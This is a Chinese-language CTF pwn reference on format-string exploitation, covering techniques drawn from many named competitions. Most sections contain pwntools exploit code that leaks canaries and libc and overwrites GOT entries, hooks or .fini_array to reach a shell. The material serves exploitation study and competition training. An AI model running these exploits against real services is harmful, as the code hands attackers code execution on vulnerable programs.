# CTF Pwn - 格式化字符串利用

## 目录
- [格式化字符串基础](#格式化字符串基础)
- [参数重定向（非位置化 %n 技巧）](#参数重定向非位置化-n-技巧)
- [盲打 Pwn（未提供二进制）](#盲打-pwn未提供二进制)
- [带过滤绕过的格式化字符串](#带过滤绕过的格式化字符串)
- [格式化字符串泄漏 canary + PIE](#格式化字符串泄漏-canary--pie)
- [通过格式化字符串覆写 __free_hook（glibc < 2.34）](#通过格式化字符串覆写-__free_hookglibc--234)
- [.rela.plt / .dynsym 补丁](#relaplt--dynsym-补丁)
- [用格式化字符串篡改游戏状态（UTCTF 2026）](#用格式化字符串篡改游戏状态utctf-2026)
- [格式化字符串覆写保存的 EBP 以迁移到 .bss（PlaidCTF 2015）](#格式化字符串覆写保存的-ebp-以迁移到-bssplaidctf-2015)
- [覆写 argv\[0\] 借助栈破坏信息泄漏（HITCON CTF 2015）](#argv0-overwrite-for-stack-smash-info-leak-hitcon-ctf-2015)
- [格式化字符串 .fini_array 循环做多阶段利用（Codegate 2016）](#格式化字符串-fini_array-循环做多阶段利用codegate-2016)
- [用顺序 %p 绕过 __printf_chk（VolgaCTF 2017）](#用顺序-p-绕过-__printf_chkvolgactf-2017)
- [单次 printf 调用内完成泄漏 + GOT 覆写（picoCTF 2017）](#单次-printf-调用内完成泄漏--got-覆写picoctf-2017)
- [Objective-C %@ 格式符利用（SHA2017）](#objective-c--格式符利用sha2017)
- [strlen 整数截断绕过（ASIS CTF Finals 2017）](#strlen-整数截断绕过asis-ctf-finals-2017)
- [通过缓冲区溢出覆写 printf_function_table（34C3 CTF 2017）](#通过缓冲区溢出覆写-printf_function_table34c3-ctf-2017)
- [栈上 scanf 格式化字符串的覆写（TUCTF 2017）](#栈上-scanf-格式化字符串的覆写tuctf-2017)
- [通过 ROT13 编码的格式化字符串利用（SunshineCTF 2018）](#通过-rot13-编码的格式化字符串利用sunshinectf-2018)
- [HTTP User-Agent 中的格式化字符串泄漏 PIE（X-MAS CTF 2018）](#http-user-agent-中的格式化字符串泄漏-piex-mas-ctf-2018)
- [小缓冲区中的空字节地址碎片化（FireShell 2019）](#小缓冲区中的空字节地址碎片化fireshell-2019)

---

<a id="format-string-basics"></a>
## 格式化字符串基础

- 泄漏栈：`%p.%p.%p.%p.%p.%p`
- 泄漏指定偏移：`%7$p`
- 写值：`%n`（4 字节）、`%hn`（2 字节）、`%hhn`（1 字节）、`%lln`（8 字节）
- 覆写 GOT 实现代码执行

**写入尺寸说明符（x86-64）：**
| 说明符 | 写入字节数 | 使用场景 |
|-----------|---------------|----------|
| `%n` | 4 | 32 位值 |
| `%hn` | 2 | 拆分写入 |
| `%hhn` | 1 | 精确字节写入 |
| `%lln` | 8 | 完整 64 位地址（清除高字节） |

**重要：** x86-64 上 GOT 项是 8 字节。用 `%n`（4 字节）会让高 4 字节保留旧 libc 地址的垃圾数据。要用 `%lln` 写满 8 字节并把高位清零。

**任意读原语：**
```python
def arb_read(addr):
    # %7$s reads string at address placed at offset 7
    payload = flat({0: b'%7$s#', 8: addr})
    io.sendline(payload)
    return io.recvuntil(b'#')[:-1]
```

**任意写原语：**
```python
from pwn import fmtstr_payload
payload = fmtstr_payload(offset, {target_addr: value})
```

**手工 GOT 覆写（x86-64）：**
```python
# Format: %<value>c%<offset>$lln + padding + address
# Address at offset 8 when format is 16 bytes

win = 0x4011f6
target_got = 0x404018  # e.g., printf@GOT

fmt = f'%{win}c%8$lln'.encode()  # Write 'win' chars then store to offset 8
fmt = fmt.ljust(16, b'X')        # Pad to 16 bytes (2 qwords)
payload = fmt + p64(target_got)  # Address lands at offset 6 + 16/8 = 8

# Note: This prints ~4MB of spaces - be patient waiting for output
```

**地址的偏移计算：**
- 缓冲区通常从偏移 6 开始（位于寄存器参数之后）
- 若格式化字符串填充到 N 字节，地址从偏移 `6 + N/8` 开始
- 例：16 字节格式串 → 地址在偏移 8
- 例：32 字节格式串 → 地址在偏移 10
- 例：64 字节格式串 → 地址在偏移 14

**用测试载荷验证偏移：**
```python
# Put known address after N-byte format, check with %<calculated_offset>$p
test = b'%8$p___XXXXXXXXX'  # 16 bytes
payload = test + p64(0xDEADBEEF)
# Should print 0xdeadbeef if offset 8 is correct
```

**GOT 目标选择：**
- 若 `exit@GOT` 不奏效，尝试其他 GOT 项
- `printf@GOT`、`puts@GOT`、`putchar@GOT` 都是不错的替代
- 目标函数应在格式化字符串漏洞**之后**被调用
- 在反汇编中查看调用顺序以选出最佳目标

**关键点：** 发送 `%p.%p.%p` 作为输入即可识别格式化字符串漏洞——若输出中出现十六进制地址，说明程序把用户输入直接当成了 `printf`/`sprintf` 的格式参数。这同时给出任意读（`%s` 配合目标地址）和任意写（`%n` 家族）原语。

<a id="argument-retargeting-non-positional-n-trick"></a>
## 参数重定向（非位置化 %n 技巧）

当你无法嵌入地址（输入过滤、换行问题），但仍能用 `%n` 且栈上有可用的指针参数时，使用本技巧。

**核心思路：** 非位置化说明符按顺序消费参数。你可以在某个*未来的*参数（本身是个指针）被使用之前覆写它，然后把它当作任意写目标。

**为什么用非位置化：** 位置化格式（`%22$hn`）会被 glibc 预先缓存，解析之后再改栈槽不会改变指针。非位置化的 `%n` 能避开这个缓存。

**工作流程（示例）：**
1. 泄漏偏移：找一个可覆写的栈指针参数（例如栈上保存的 `rbp`）。
2. 用 `%c` 推进参数索引（每个 `%c` 消费一个参数）。
3. 用 `%n` 把一个 4 字节值写入该指针槽（例如让第 22 个参数指向 `exit@GOT`）。
4. 再打印若干字符，用 `%hn` 把低 2 字节写到已被重定向的指针。

**模式（概念）：**
```text
%c%c%c...%c      # consume args to reach pointer slot
%<big>c%n        # overwrite pointer slot to target_addr (e.g., exit@GOT)
%<delta>c%hn     # write low 2 bytes of win to that GOT entry
```

**计算宽度：**
- 用 `%n` 写入 `target_addr` 后，已打印计数为 `C`。
- 要用 `%hn` 写入低 2 字节 `W`，需打印：
  - `delta = (W - (C % 65536)) mod 65536`

**适用条件：**
- 无 PIE / Partial RELRO（GOT 可写）
- 能承受大量输出（数百万字符）

**栈布局探测（找到自己的输入偏移）：**
```text
%1$p %2$p %3$p ... %50$p
```
- 你的输入会出现在某个偏移（常见为 6-8）
- Canary：形如 `0x...00`（末尾空字节）
- 保存的 RBP：栈地址特征
- 返回地址：代码地址（PIE 或 libc）

<a id="blind-pwn-no-binary-provided"></a>
## 盲打 Pwn（未提供二进制）

未提供二进制时，用格式化字符串把一切探明：

**1. 确认漏洞：**
```text
> %p-%p-%p-%p
0x563b6749100b-0x71-0xffffffff-0x7ffff9c37b80
```

**2. 通过泄漏栈推断保护：**
- 找 canary（约偏移 39，形如 `0x...00`）
- 找保存的 RBP（约偏移 40，栈地址）
- 找返回地址（约偏移 41-43，代码指针）

**3. 确定 PIE 基址：**
- 泄漏指向 main/程序代码的返回地址
- 减去已知偏移得到基址（可能需要猜测）

**4. dump GOT 以识别 libc：**
```python
# Read GOT entries for known functions
puts_addr = arb_read(pie_base + got_puts_offset)
stack_chk_addr = arb_read(pie_base + got_stack_chk_offset)
```

**5. 对照 libc 数据库：**
- https://libc.rip/
- 输入多个函数地址以确定精确的 libc 版本

**关键点：** 没有二进制的盲打需要系统性探测：泄漏栈值找到 canary/PIE/libc 指针，用任意读 dump GOT 项，把泄漏地址与 libc 数据库对照确定精确版本，然后计算 one_gadget 或 system() 的偏移。

**6. 计算 libc 基址：**
```python
# From leaked __libc_start_main return or similar
libc.address = leaked_ret_addr - known_offset
```

**常见栈偏移（x86_64）：**
| 偏移 | 典型内容 |
|--------|-----------------|
| 6-8 | 用户输入缓冲区 |
| ~39 | 栈 canary |
| ~40 | 保存的 RBP |
| ~41-43 | 返回地址 |

<a id="format-string-with-filter-bypass"></a>
## 带过滤绕过的格式化字符串

**模式（Cvexec）：** `filter_string()` 会剥掉 `%`，但可以用 `%%%p` 绕过。

**过滤绕过：** 若过滤器检查 `%` 之后的相邻字符：
- `%p` → 被过滤
- `%%p` → 正确转义（打印字面量 `%p`）
- `%%%p` → 第三个 `%` 存活，打印栈值

**通过格式化字符串覆写 GOT（用 `%hhn` 逐字节）：**
```python
# Write last 3 bytes of debug() addr to strcmp@GOT across 3 payloads
# Pad address to consistent stack offset (e.g., 14th position)
for byte_offset in range(3):
    target = got_strcmp + byte_offset
    byte_val = (debug_addr >> (byte_offset * 8)) & 0xff
    # Calculate chars to print, accounting for previous output
    payload = f"%%%dc%%%d$hhn" % (byte_val - prev_written, 14)
    payload = payload.encode().ljust(48, b'X') + p64(target)
```

<a id="format-string-canary--pie-leak"></a>
## 格式化字符串泄漏 canary + PIE

**模式（My Little Pwny）：** 用格式化字符串泄漏 canary 与 PIE 基址，再做缓冲区溢出。

**两阶段攻击：**
```python
# Stage 1: Leak via format string
io.sendline(b'%39$p.%41$p')  # Canary at offset 39, return addr at 41
leak = io.recvline()
canary = int(leak.split(b'.')[0], 16)
pie_base = int(leak.split(b'.')[1], 16) - known_offset

# Stage 2: Buffer overflow with known canary
win = pie_base + win_offset
payload = b'A' * buf_size + p64(canary) + p64(0) + p64(win)
io.sendline(payload)
```

<a id="__free_hook-overwrite-via-format-string-glibc--234"></a>
## 通过格式化字符串覆写 __free_hook（glibc < 2.34）

**模式（Notetaker，PascalCTF 2026）：** Full RELRO + 无 PIE + 格式化字符串漏洞。无法覆写 GOT，但 `__free_hook` 可写。

**关键点：** `free(ptr)` 把 `ptr` 放在 `rdi` 中作为第一参数。若 `__free_hook = system`，则 `free("cat flag")` 会执行 `system("cat flag")`。

```python
# 1. Leak libc via format string
p.sendline(b'%43$p')  # __libc_start_main return address
libc_base = int(leaked, 16) - LIBC_START_MAIN_RET_OFFSET

# 2. Write system() address to __free_hook
free_hook = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']
payload = fmtstr_payload(8, {free_hook: system_addr}, write_size='byte')

# 3. Trigger: send command as menu input, program calls free(input_buffer)
p.sendline(b'cat flag')  # free() → system("cat flag")
```

**何时使用：** Full RELRO（无法覆写 GOT）+ glibc < 2.34（hook 仍存在）。glibc >= 2.34 已移除 hook——改为针对返回地址或 `_IO_FILE` 结构体。

<a id="relaplt--dynsym-patching"></a>
## .rela.plt / .dynsym 补丁

**何时使用：** GOT 地址含坏字节（例如配合 fgets 时的 0x0a），导致无法直接覆写 GOT。需要 `.rela.plt` 与 `.dynsym` 位于可写内存。

**技巧：** 把 `.rela.plt` 重定位项的符号索引改成指向另一个符号，再把 `.dynsym` 中该符号的 `st_value` 补丁为 `win()` 的地址。原函数被调用时，动态链接器读取被补丁的重定位项并跳到 `win()`。

```python
# Key addresses (from readelf -S)
REL_SYM_BYTE = 0x4006ec   # .rela.plt[exit].r_info byte containing symbol index
STDOUT_STVAL_LO = 0x4004e8  # .dynsym[11].st_value low halfword
STDOUT_STVAL_HI = 0x4004ea  # .dynsym[11].st_value high halfword

# Format string writes via %hhn (8-bit) and %hn (16-bit)
# 1. Write symbol index 0x0b to r_info byte
# 2. Write win() address low halfword to st_value
# 3. Write win() address high halfword to st_value+2
```

**当 GOT 含坏字节但 .rela.plt/.dynsym 不含时：** 因为完全不直接写 GOT，该技巧绕过了所有 GOT 字节限制。

**关键点：** 当 GOT 地址含坏字节（例如配合 `fgets` 时的 `0x0a`）时，避免直接写 GOT。改为补丁 `.rela.plt`，把重定位重定向到另一个 `.dynsym` 项，再覆写该符号的 `st_value` 为目标地址。下次调用时动态链接器会沿被篡改的链条走。

---

<a id="format-string-for-game-state-manipulation-utctf-2026"></a>
## 用格式化字符串篡改游戏状态（UTCTF 2026）

**模式（Small Blind）：** 扑克/卡牌游戏，玩家名字存在格式化字符串漏洞。栈上包含指向游戏状态变量的指针（玩家筹码、庄家筹码）。写入任意数值即可满足获胜条件。

**关键点：** `%n` 写入的是目前已打印的字符数。用 `%Xc` 控制该计数，再用 `%N$n` 写到第 N 个栈参数（它指向某个游戏变量）。

**利用：**
```python
from pwn import *

p = remote('challenge.utctf.live', 7255)
p.recvuntil(b'Enter your name: ')

# %1000c prints 1000 chars (padding), then %7$n writes 1000 to stack pos 7
# Stack position 7 = pointer to player_chips variable
p.sendline(b'%1000c%7$n')

# Player now has 1000 chips → triggers win condition
# Collect flag from game output
```

**探测流程：**
1. **确认格式化字符串：** 把 `%p.%p.%p.%p` 作为名字发送，检查是否有十六进制泄漏
2. **映射栈位置：** 用不同 `%Xc` 值尝试 `%6$n`、`%7$n`、`%8$n`
3. **确认哪个变量被改：** 对比前后游戏输出（筹码、分数、血量）
4. **确定获胜条件：** 可能是 `player_chips >= threshold` 或 `player > dealer`
5. **构造获胜载荷：** 把玩家筹码设高（`%9999c%7$n`）或把庄家筹码设为 0（`%6$n`）

**栈上常见的游戏状态模式：**
| 位置 | 典型变量 |
|----------|-----------------|
| 6 | 指向庄家/对手状态的指针 |
| 7 | 指向玩家状态的指针 |
| 8-10 | 分数、血量、物品栏 |

**当 `%n` 写向相邻变量时：** 若玩家与庄家筹码在内存中相邻（相差 4 字节），位置 N 与 N+1 分别指向它们。把 0 写给庄家（打印 0 字符时用 `%N$n`），把高值写给玩家（`%9999c%(N+1)$n`）。

**关键点：** 游戏程序中的格式化字符串比常规 pwn 更简单——不需要 shell，只要篡改游戏状态触发获胜条件即可。把栈位置映射到游戏变量，然后写入获胜数值。

---

<a id="format-string-saved-ebp-overwrite-for-bss-pivot-plaidctf-2015"></a>
## 格式化字符串覆写保存的 EBP 以迁移到 .bss（PlaidCTF 2015）

**模式（EBP）：** 格式化字符串缓冲区位于 `.bss`（固定地址）而非栈上。经典的 `%n` 任意写需要攻击者地址出现在栈上，`.bss` 缓冲区做不到。改为覆写保存的 EBP，把函数收尾（`leave; ret`）重定向到 `.bss` 缓冲区。

**`leave; ret` 的工作方式：**
```asm
leave:  mov esp, ebp    ; esp = saved_ebp
        pop ebp         ; ebp = [saved_ebp]
ret:    pop eip         ; eip = [saved_ebp + 4]
```

**位于 `0x0804A080` 的 `.bss` 缓冲区中的利用布局：**
```text
[addr_of_buf-4][padding_to_write_value][%n][shellcode...]
```
用 `%n` 把 `buf_addr - 4`（例如 `0x0804A07C`）写入保存的 EBP。函数返回时，`leave` 置 `esp = 0x0804A07C`，随后 `ret` 跳转到 `0x0804A080` 处的值——即 shellcode 开头。

**关键点：** 当格式化字符串缓冲区位于固定的 `.bss` 地址（而非栈）时，覆写保存的 EBP 把栈迁入 `.bss`。`leave; ret` 收尾用 EBP 设置 ESP，因此控制 EBP 就控制了 `ret` 从何处读取 EIP。把 shellcode 地址（或 ROP 链）放在 `buf_addr`，shellcode 放在 `buf_addr + offset`。

---

<a id="argv0-overwrite-for-stack-smash-info-leak-hitcon-ctf-2015"></a>
## 覆写 argv[0] 借助栈破坏信息泄漏（HITCON CTF 2015）

**模式（nanana）：** 栈 canary 被破坏时，glibc 的 `__stack_chk_fail` 会打印：`*** stack smashing detected ***: <argv[0]> terminated`。由于 `argv[0]` 是存储在栈上的指针，把它覆写为某个秘密（例如全局密码缓冲区）的地址，就能通过崩溃消息泄漏该秘密。

**攻击步骤：**
1. 溢出越过 canary（故意破坏它）
2. 继续覆写栈以抵达 `argv[0]`（指向程序名的指针）
3. 把 `argv[0]` 替换为目标数据的地址（例如 `0x601090` = `g_password`）
4. 栈破坏处理器打印：`*** stack smashing detected ***: <password_contents>`

```python
# Overflow to overwrite argv[0] with address of global password
payload = b"A" * canary_offset     # reach canary (deliberately corrupt it)
payload += b"B" * (argv0_offset - canary_offset)  # padding to argv[0]
payload += p64(password_addr)      # overwrite argv[0] -> password string
```

**关键点：** 一个“失败”的利用（触发 `__stack_chk_fail`）在覆写 `argv[0]` 之后就变成了信息泄漏。这适合作为第一阶段：泄漏秘密（密码、canary、地址），然后在第二个连接中用于真正的利用。可行是因为 `argv` 存储在栈上、位于局部变量之上。

---

<a id="format-string-fini_array-loop-for-multi-stage-exploitation-codegate-2016"></a>
## 格式化字符串 .fini_array 循环做多阶段利用（Codegate 2016）

**模式：** 当 `printf()` 之后没有任何 GOT 函数被调用时，通过把 `.fini_array` 覆写为 `main()`，把多次格式化字符串写入跨重执行串联起来：

1. **阶段 1：** 把 `.fini_array[0]` 覆写为 `main()`，泄漏 libc + 栈指针
2. **阶段 2：** 把 `printf@GOT` 覆写为 `system()`，把 `__stack_chk_fail@GOT` 覆写为 `main()`
3. **阶段 3：** 故意破坏栈 canary 让 `__stack_chk_fail` 重入 `main()`。此时 `printf(input)` 就是 `system(input)`——发送 `/bin/sh`

```python
# Stage 1: loop back via .fini_array, leak addresses
payload = fmtstr_payload(offset, {fini_array: main_addr})
# Stage 2: redirect printf to system, set up canary fail re-entry
payload = fmtstr_payload(offset, {printf_got: system, stack_chk_got: main_addr})
# Stage 3: corrupt canary -> __stack_chk_fail -> main -> system(input)
```

**关键点：** `main()` 返回时会调用 `.fini_array` 中的条目。把它覆写为 `main()` 就形成了用于多阶段格式化字符串攻击的执行循环。当该 GOT 项已被重定向时，故意破坏 canary 会触发 `__stack_chk_fail`，成为一个可控的重入向量。

**参考：** Codegate 2016

---

<a id="__printf_chk-bypass-with-sequential-p-volgactf-2017"></a>
## 用顺序 %p 绕过 __printf_chk（VolgaCTF 2017）

**模式：** `__printf_chk()` 禁止 `%n` 写入与直接参数访问（`%123$p`）。通过串联顺序 `%p` 说明符抵达目标栈偏移来绕过。

```python
from pwn import *

# __printf_chk restrictions:
# - No %n/%hn/%hhn writes
# - No direct access: %123$p fails
# - Sequential access still works: %p%p%p...

# Leak canary at stack offset 267:
payload = "%p." * 267 + "%p"  # sequential %p to offset 267
io.sendline(payload.encode())
response = io.recvline().decode()
leaks = response.split(".")
canary = int(leaks[266], 16)  # 267th value (0-indexed)

# Leak libc return address at offset 269:
payload = "%p." * 269 + "%p"
io.sendline(payload.encode())
response = io.recvline().decode()
leaks = response.split(".")
libc_ret = int(leaks[268], 16)
libc_base = libc_ret - known_offset

# Then use stack overflow for ROP since format string write is blocked
payload = b"A" * buf_size
payload += p64(canary)
payload += p64(0)           # saved rbp
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)
io.sendline(payload)
```

**关键点：** 尽管 `__printf_chk` 禁止 `%n` 与直接参数访问（`%N$`），它仍允许顺序格式说明符。串联数百个 `%p` 可抵达任意栈偏移，即使没有写能力也能泄漏（canary、libc、PIE）。再配合另一个溢出漏洞完成写阶段。

**何时识别：** 程序使用 `__printf_chk` 或 `__fprintf_chk`（反汇编中可见，或存在 `__fortify_source`）。直接 `%N$p` 失败但顺序 `%p%p%p...` 仍可用。输出可能非常大——用分隔符小心解析。

**参考：** VolgaCTF 2017

---

<a id="leak--got-overwrite-in-single-printf-call-picoctf-2017"></a>
## 单次 printf 调用内完成泄漏 + GOT 覆写（picoCTF 2017）

**模式：** 当格式化字符串漏洞之后紧接 `exit(0)` 时，在一次 printf 调用中同时完成地址泄漏与 GOT 覆写。

```python
from pwn import *

# Must leak libc AND redirect exit() in one printf call
# Layout: padding + dummy_addr + %leak$p + %Nc + %write$hn + padding + got_addr

exit_got = elf.got['exit']
main_addr = elf.sym['main']
target_low16 = main_addr & 0xFFFF

payload = b'e_______'                     # 8 bytes padding
payload += p64(0x4141414141)              # dummy (consumed by leak specifier)
payload += b' %25$p'                      # leak libc address at offset 25
# Calculate bytes needed: target_low16 - bytes_written_so_far
bytes_written = len(payload)
padding_needed = (target_low16 - bytes_written) % 0x10000
payload += f'%{padding_needed}c%19$hn'.encode()  # write low 2 bytes to offset 19
payload += b'A' * ((8 - (len(payload) % 8)) % 8) # alignment to 8 bytes
payload += p64(exit_got)                  # address for %19$hn write

# Result: leaks libc via %25$p AND overwrites exit@GOT via %19$hn
# exit() jumps back to main for second-stage exploitation
io.sendline(payload)

# Parse leaked libc address from output
io.recvuntil(b' 0x')
libc_leak = int(io.recv(12), 16)
libc_base = libc_leak - known_offset

# Second pass: now with libc known, overwrite for shell
# ...
```

**关键点：** 单次 `printf` 可以同时做读（`%p`）和写（`%hn`）。当 `exit()` 紧随漏洞之后时，在同一次调用中把 `exit@GOT` 覆写为 `main` 的地址并泄漏 libc，从而建立重入点以完成完整利用。关键在于仔细计算偏移，让泄漏说明符与写入说明符引用正确的栈位置。

**何时识别：** 格式化字符串漏洞在 `exit()` 或其他终止函数之前只有一次机会。单次调用技巧避免了在建立重入机制之前需要循环或重入的问题。

**参考：** picoCTF 2017

---

<a id="objective-c--format-specifier-exploitation-sha2017"></a>
## Objective-C %@ 格式符利用（SHA2017）

**模式：** Objective-C 的 `NSLog` 及相关函数支持 `%@` 格式符，它会调用 `objc_msg_lookup(rdi, ...)`，把对应的栈值视为 Objective-C 对象指针。控制 `%N$@` 指向的栈值，即可控制 `rdi`。对 `objc_msg_lookup` 的分析显示，在特定条件下可到达一个 `call rax` gadget，实现一次调用完成利用。

**机制：**
```text
NSLog(@"Hello %@", user_input)
    → %@ consumes next argument from stack
    → argument is treated as Objective-C object pointer (rdi)
    → objc_msg_lookup(rdi, "description") is called
    → if [rdi+8] == 0 (ISA check fails), execution reaches: call rax
    → rax is under attacker control via the crafted "object"
```

**利用：**
```python
# Craft a fake Objective-C object on the stack via format string write
# Object layout: [isa_ptr][method_list_ptr][...]
# Set isa_ptr = 0 to reach the call rax path in objc_msg_lookup
# Set rax = one_gadget or system() via prior %n writes

# Locate %N$@ position: stack offset where fake object pointer lands
# Use %n to write fake object address at the right stack slot
# Then trigger %@ to call objc_msg_lookup → call rax → shell
payload = b'%<distance>c%<write_offset>$lln'  # write fake obj addr
payload += b'%<obj_offset>$@'                  # trigger call rax
```

**关键点：** Objective-C 格式串包含 `%@`，它会对栈指针调用 `objc_msg_lookup`——把只读的 FSB 变成经由 objc 运行时的受控调用原语。ISA 指针检查失败时可到达 `objc_msg_lookup` 内部的 `call rax` gadget，因此一个构造好的“空 ISA”对象就足以重定向执行流。

**参考：** SHA2017

---

<a id="strlen-integer-truncation-bypass-asis-ctf-finals-2017"></a>
## strlen 整数截断绕过（ASIS CTF Finals 2017）

**模式：** 程序通过检查 `strlen(input)+1` 之前的每个字符是否为小写来过滤格式化字符串输入。然而 `strlen()` 结果被转换为 `int8_t`：输入长度为 255 时，`(int8_t)(255 + 1)` 溢出为 0，清洗窗口坍缩为空区间。放在第 255 字节之后的 `%n` 等格式符完全绕过过滤。

**存在漏洞的代码模式：**
```c
void filter(char *input) {
    int8_t len = (int8_t)strlen(input);  // truncates at 255 → wraps to -1 or 0
    for (int8_t i = 0; i <= len; i++) {  // at len==-1 (255 cast): 0 <= -1 is false
        if (!islower(input[i]))
            reject();
    }
}
```

**利用：**
```python
# Pad with 255 lowercase bytes, then place %n-based payload starting at byte 255
# The filter checks bytes 0..len, but len wraps to -1 (or 0+1=0), so no bytes checked
filler = b'a' * 255
exploit_suffix = b'%7$n' + p64(target_addr)  # unchecked bytes
payload = filler + exploit_suffix
```

**关键点：** `strlen()` 结果转换为 `int8_t` 时在长度 255 处产生有符号溢出，把清洗窗口坍缩为零。位于第 255 字节及之后的任何载荷内容都会逃过过滤。只要长度字段存放在有符号类型或短整型中，就要检查整数截断。

**参考：** ASIS CTF Finals 2017

---

<a id="printf_function_table-overwrite-via-buffer-overflow-34c3-ctf-2017"></a>
## 通过缓冲区溢出覆写 printf_function_table（34C3 CTF 2017）

**模式：** 利用 glibc 内部 printf 分发表，把缓冲区溢出变成信息泄漏，无需格式化字符串漏洞。当 `printf_function_table` 非 NULL 时，glibc 会改经 `printf_arginfo_table` 分发格式说明符，而非默认处理器。

**机制：**
1. 缓冲区溢出构造假的 `printf_arginfo_size_function` 结构体，指向 `_fortify_fail`
2. 覆写 `__libc_argv`，使 `_fortify_fail` 打印 flag 而非真正的 `argv[0]`
3. 把 `printf_function_table` 设为非 NULL（触发备用分发）
4. 把 `printf_arginfo_table` 指向假结构体

**分发如何工作：**
```c
// Inside glibc's printf implementation:
if (__printf_function_table != NULL) {
    // Alternate path: look up handler via printf_arginfo_table
    int spec_index = format_char;  // e.g., 'd' = 100
    // Calls printf_arginfo_table[spec_index](...)
    // → redirected to _fortify_fail
}

// _fortify_fail prints:
//   "*** buffer overflow detected ***: %s terminated\n", __libc_argv[0]
// If __libc_argv[0] points to the flag → flag is leaked
```

**利用：**
```python
from pwn import *

# Addresses determined from libc
printf_function_table = libc_base + PRINTF_FUNCTION_TABLE_OFF
printf_arginfo_table = libc_base + PRINTF_ARGINFO_TABLE_OFF
libc_argv = libc_base + LIBC_ARGV_OFF
fortify_fail = libc_base + FORTIFY_FAIL_OFF

# Step 1: Overflow to overwrite __libc_argv to point to flag location
# Step 2: Create fake arginfo table entry pointing to _fortify_fail
# Step 3: Set printf_function_table to non-NULL
# Step 4: Set printf_arginfo_table to fake table

# Any subsequent printf with a format specifier (e.g., %d, %s)
# triggers: printf_arginfo_table['d'] → _fortify_fail
# _fortify_fail reads __libc_argv[0] → prints flag contents
```

**关键点：** 当 `printf_function_table` 非 NULL 时，glibc 会经 `printf_arginfo_table` 分发格式说明符。同时覆写两者即可把任意 printf 格式说明符重定向到任意函数。配合 `_fortify_fail`（它会打印 `__libc_argv[0]`），无需格式化字符串漏洞就能把缓冲区溢出变成信息泄漏。

**何时识别：** 缓冲区溢出可以触及 glibc 全局变量，但没有直接的格式化字符串漏洞。目标程序在溢出之后用格式说明符调用 `printf`。适用于以信息外泄（泄漏 flag）而非代码执行为目标时。

**参考：** 34C3 CTF 2017

---

<a id="scanf-format-string-on-stack-overwrite-tuctf-2017"></a>
## 栈上 scanf 格式化字符串的覆写（TUCTF 2017）

**模式：** 当 `scanf` 的格式化字符串（例如 `"%30s"`）存放在栈上、紧邻用户输入缓冲区（而非放在 `.rodata`）时，第一次输入可以溢出到格式说明符本身，扩大下一次调用的读取上限。

**两阶段溢出：**
```python
from pwn import *

# Stage 1: Overflow the scanf format string on the stack
# Format "%30s" is stored 0x14 bytes after the input buffer
# Overwrite it to become "%99s"
payload0 = b"0" * 0x14 + p32(0x73393925)  # 0x73393925 = "%99s" in little-endian
io.sendline(payload0)

# Stage 2: scanf now reads up to 99 bytes instead of 30
# Use the expanded buffer to reach and overwrite the return address
payload1 = b"0" * 0x31 + p32(win_addr)     # 0x31 bytes padding + return address
io.sendline(payload1)
```

**栈布局：**
```text
+0x00: input_buffer[30]    ← scanf reads here
+0x14: format_string[4]    ← "%30s" (overwritten to "%99s")
  ...
+0x31: saved_ebp
+0x35: return_address       ← target for stage 2
```

**关键点：** 如果 `scanf` 的格式说明符在栈上（而非 `.rodata`），第一次输入就能覆写它以扩大读取长度，第二次输入即可用扩大后的格式串抵达返回地址。两阶段溢出：先扩大格式串，再利用扩大后的缓冲区。通过检查反汇编判断格式串是否栈分配——`lea` 来自 `rbp`/`rsp` 偏移（栈）还是 `rip` 相对地址（`.rodata`）。

**何时识别：** 程序用带长度限制的格式串调用 `scanf`（例如 `%30s`），但溢出距离返回地址还差一点。若格式串是栈上的局部变量而非字符串字面量，这个两阶段技巧就能补上差距。

**参考：** TUCTF 2017

---

<a id="format-string-exploit-through-rot13-encoding-sunshinectf-2018"></a>
## 通过 ROT13 编码的格式化字符串利用（SunshineCTF 2018）

**模式：** 一个“ROT13 加密服务”在把用户输入传给 `printf` 之前做 ROT13。仍然可以泄漏地址、构造格式化字符串载荷，但要先做 ROT13 编码，让它们经过变换后仍完整抵达 `printf`。

**攻击链：**
1. 输入在抵达 `printf` 前被程序做 ROT13
2. ROT13 自逆：`rot13(rot13(x)) = x`
3. 预先用 ROT13 编码格式化字符串载荷，使变换后产生预期的格式说明符
4. 通过 ROT13 编码的 `%p` 说明符泄漏 libc 与程序地址
5. 构造 `fmtstr_payload` 把 `strlen@GOT` 覆写为 `system`，然后发送 `/bin/sh`

```python
import codecs
from pwn import *

def rot13(s):
    return codecs.encode(s, 'rot_13')

io = remote('target', 1337)

# Stage 1: Leak addresses through ROT13 transform
# rot13('%2$x|%3$x') produces encoded string; after binary's rot13, printf sees '%2$x|%3$x'
io.sendline(rot13('%2$x|%3$x').encode())
leak = io.recvline().decode()
libc_leak, prog_leak = leak.split('|')
libc_base = int(libc_leak, 16) - known_offset
prog_base = int(prog_leak, 16) - known_offset

# Stage 2: Overwrite strlen@GOT with system via format string
strlen_got = prog_base + elf.got['strlen']
system_addr = libc_base + libc.symbols['system']
writes = {strlen_got: system_addr}
payload = fmtstr_payload(7, writes)

# ROT13-encode the entire payload so binary's rot13 produces the real fmt string
encoded_payload = rot13(payload.decode('latin-1')).encode('latin-1')
io.sendline(encoded_payload)

# Stage 3: Send /bin/sh -- strlen("/bin/sh") now calls system("/bin/sh")
io.sendline(b'/bin/sh')
io.interactive()
```

**关键点：** 当输入在抵达 printf 之前被变换（ROT13、Caesar 等）时，用逆变换预先编码格式化字符串载荷。ROT13 自逆，因此 `rot13(rot13(payload)) = payload` 会完整抵达 printf。这适用于任何在格式化字符串汇聚点之前实施的可逆变换——XOR、base64、替换密码等。

**参考：** SunshineCTF 2018

---

<a id="format-string-in-http-user-agent-for-pie-leak-x-mas-ctf-2018"></a>
## HTTP User-Agent 中的格式化字符串泄漏 PIE（X-MAS CTF 2018）

**模式：** 一个 PIE 编译的 HTTP 服务器用 `printf(ua)` 记录 `User-Agent` 头。程序中没有其他信息泄漏原语，但栈 canary 与 PIE 基址都位于日志记录栈帧附近。一次请求即可在单个响应中泄漏两者。

```python
# Leak canary at offset 6, PIE base at offset 7
r = requests.get('http://target/', headers={'User-Agent': '%6$p.%7$p'})
canary, pie = [int(x, 16) for x in r.text.strip().split('.')]
pie_base = pie - elf.sym['main']
```

**关键点：** 任何被解析进格式化字符串汇聚点的头字段，都会把远端 HTTP 服务器变成泄漏预言机。在认定必须依赖二进制本地原语之前，先检查日志、错误消息和反射头。

**参考：** X-MAS CTF 2018 — I want that toy，writeup 12672

